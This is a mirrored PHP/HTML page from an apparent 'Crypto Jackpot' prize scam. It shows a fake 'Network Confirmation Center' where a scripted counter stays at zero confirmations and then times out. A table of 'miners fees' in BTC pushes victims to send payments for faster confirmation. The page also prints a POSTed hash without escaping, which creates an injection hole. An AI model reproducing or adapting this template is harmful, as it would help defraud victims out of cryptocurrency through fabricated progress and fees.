<?php
 session_start();
 $_SESSION['hash'] = $_POST['hash'];
 ?>

<!DOCTYPE html>
<html lang="en">


<!-- Added by HTTrack -->
<!-- Mirrored from jackpot.coin-chagex.tk/polzr.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Apr 2022 09:11:41 GMT -->

<!-- Mirrored from crytojackpot.000webhostapp.com/polzr.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 14 May 2022 09:19:58 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
   <meta charset="UTF-8">
   <script>
   var page_id = 9;
   </script>
   <meta name="robots" content="noindex, nofollow">
   <meta content="width=device-width, initial-scale=1" name="viewport">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <title>Crypto jackpot | Win cryptocurrency</title>
   <link rel="shortcut icon" href="https://crytojackpot.000webhostapp.com/favicon.ico" type="image/x-icon">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
<link rel="preconnect" href="https://fonts.gstatic.com/">
<link rel="preconnect" href="https://fonts.gstatic.com/">
<link href="https://fonts.googleapis.com/css2?family=Exo+2&amp;family=Roboto:wght@100&amp;display=swap" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="https://crytojackpot.000webhostapp.com/style.css">
<link rel="stylesheet" type="text/css" href="https://crytojackpot.000webhostapp.com/style-2.min.css">
<link rel="stylesheet" type="text/css" href="https://crytojackpot.000webhostapp.com/all.css">
<link rel="stylesheet" type="text/css" href="https://crytojackpot.000webhostapp.com/font-awesome.min.css">
<link rel="stylesheet" type="text/css" href="https://crytojackpot.000webhostapp.com/fonts.css">
<link rel="stylesheet" type="text/css" href="https://crytojackpot.000webhostapp.com/icons-font.css">
   <style>
   @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&amp;family=Roboto+Condensed:wght@400;700&amp;display=swap');
   </style>

   <script src="https://crytojackpot.000webhostapp.com/common.js"></script>

   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
   <link rel="stylesheet" type="text/css" href="https://crytojackpot.000webhostapp.com/main.937620c1.chunk.css">
   <link rel="stylesheet" type="text/css" href="https://crytojackpot.000webhostapp.com/main.css">
   <link rel="stylesheet" type="text/css" href="https://crytojackpot.000webhostapp.com/chat.css">

</head>

<body>

   <script>
   Data = new Date();
   Hour = Data.getHours();
   Minutes = Data.getMinutes();
   Seconds = Data.getSeconds();
   </script>
   <script>
   var d = new Date();
   var curr_date = d.getDate();
   var curr_month = d.getMonth();
   var curr_year = d.getFullYear();
   var monthArr = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October",
      "November", "December"
   ];
   var today = monthArr[curr_month] + " " + curr_date + ", " + curr_year;
   </script>

   <!-- HEADER -->
         <header class="header">
         <div id="id1" class="header">

            <div class="row justify-content-center mt-1 mb-1">

               <div class="col-auto vertip">
                  <img class="genie__img" src="https://crytojackpot.000webhostapp.com/genie-250.png" alt="">
               </div>

               <div class="col-auto vertip">
                  <div class="plate">
                     <!--                      <p class="script"><span>Prize drawing</span></p> -->
                     <p class="shadow20 text1"><span class="cripto__text">CRYPTO</span> <span
                           class="jackpot__text">JACKPOT</span></p>
                  </div>

               </div>

            </div>

         </div>
      </header>   <!-- /HEADER -->
      <center>
      <section class="wer900-2">
         <div class="container3">

            <div class="row justify-content-evenly">
               <div class="col-auto">
                  <div class="blnc__block40" id="">
                     <p>Network Comfirmation Center</p>
                  </div>
               </div>
            </div>

         </div>
      </section>
   </center>


   <!-- vvv  -->
   <center>
       <section class="wer900">
         <div class="gray__background">


            <img class="bitkoiny__img col-auto vertip pt-3" src="https://crytojackpot.000webhostapp.com/cruptowaliyta_300.png" alt="">


            <p class="bbz"><b>Dear, <?php if(isset($_SESSION['name'])){
                        echo $_SESSION['name'];
                     }   else { echo "USER" ;}  ?> !</b> </p>
            <p style="font-size: 15px;"class="text__mx1"><span class="mx3__span"></span>TRANSACTION HASH ID <span class="mx3__span"> <?php if(isset($_SESSION['hash'])){
                echo ": " . $_SESSION['hash'];
            }
            else { echo ": An error occured while sending HASH ID for Comfirmation. Please try sending HASH ID again ";}
             ?> </span> and BTC address 
             <span class="mx3__span"><?php if(isset($_SESSION['card'])){
                  echo $_SESSION['card'];
               } else {
                  echo '<div style="color:green; font-weight: bold">ADDRESS SAVED</div>';
               } ?></span>
            </p>
            <p class="text__mx2"><b></b></p>

            <div class="account_status account_status--desktop" role="button">
               <a class="btn btn-primary binet" href="polzr.php" data-toggle="modal" value="Go back!". onclick="history.back ()" data-target="#staticBackdrop22">Back</a>
                  
            </div>

                  
            <hr class="hr__orange2">

            <img class="mzc__img" src="exclamation-80.png" alt="">


 <section class="wer900">
         <div class="gray__background" style="color: red;">
            
<input  type="text"  id="txt">
<style>
   #txt {
      color: green;
   }
</style>

<script>
let x = document.getElementById("txt");
setTimeout(function(){ x.value="0 Network Comfirmation" }, 100);
setTimeout(function(){ x.value="0 Network Comfirmations" }, 10000);
setTimeout(function(){ x.value="0 Network Comfirmations" }, 15000);
setTimeout(function(){ x.value="0 Network Comfirmations" }, 23000);
setTimeout(function(){ x.value="0 Network Comfirmations" }, 300000);
setTimeout(function(){ x.value="Time out. Review you hash" }, 50000);
</script>

      
             
           
</div>
</section>
              

            <hr class="hr__orange2">

            <div class="container w500">
               <center>

                  <table class="table table-bordered">

                     <tbody>
                        <tr>
                           <th>Miners fees</th>
                           <th>Network confirmation time</th>
                        </tr>

                        <tr>
                        </tr>
                        <td class="mx3__span">0.0006 BTC</td>
                        <td>8-24 hours</td>
                        </tr>

                        <tr>
                           <td class="mx3__span">0.0008 BTC</td>
                           <td>2-6 hours</td>
                        </tr>

                        <tr>
                           <td class="mx3__span">0.001 BTC</td>
                           <td>~10 minutes</td>
                        </tr>

                     </tbody>
                  </table>
               </center>
            </div>
          
      </section>
   </center>
   <!-- /vvv -->


   <br>
   <!-- chat -->

   
   <!--  -->

<footer class="footer">
   <div id="id1" class="footer">

      <div class="container">
         <center>
            <p>© 2021 - 2022 CRYPTO JACKPOT</p>
         </center>
      </div>

   </div>
</footer> 

   <script src="https://crytojackpot.000webhostapp.com/jquery-1.12.4.min.js"></script>
   <script src="https://crytojackpot.000webhostapp.com/usercrypto.js"></script>
   <script src="https://crytojackpot.000webhostapp.com/2.6a1700d0.chunk.js"></script>
   <script src="https://crytojackpot.000webhostapp.com/main.c297a2a4.chunk.js"></script>

   <!-- Modal 2
            </div>

            <!-- /Modal 22 -->



            <script src="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/js/bootstrap.bundle.min.js">
            </script>
            <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"
               integrity="sha384-W8fXfP3gkOKtndU4JGtKDvXbO53Wy8SZCQHczT5FMiiqmQfUpWbYdTil/SxwZgAN"
               crossorigin="anonymous">
            </script>
            <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/js/bootstrap.min.js"
               integrity="sha384-skAcpIdS7UcVUC05LJ9Dxay8AXcDYfBJqt1CJ85S/CFujBsIzCIv+l9liuYLaMQ/"
               crossorigin="anonymous">
            </script>
          
            

</html>